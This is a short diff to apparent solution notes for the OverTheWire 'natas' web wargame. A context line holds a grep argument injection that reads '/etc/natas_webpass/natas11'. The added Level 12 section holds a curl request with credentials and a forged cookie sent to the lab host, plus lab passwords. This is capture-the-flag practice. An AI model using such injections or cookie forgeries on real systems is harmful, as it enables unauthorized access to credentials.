@@ -36,3 +36,9 @@
 * grep -i $ cat /etc/natas_webpass/natas11 dictionary.txt
 * U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 
+#### Level12
+* curl -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK -H "Cookie: data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK" -X GET "http://natas11.natas.labs.overthewire.org/"
+* EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+
+
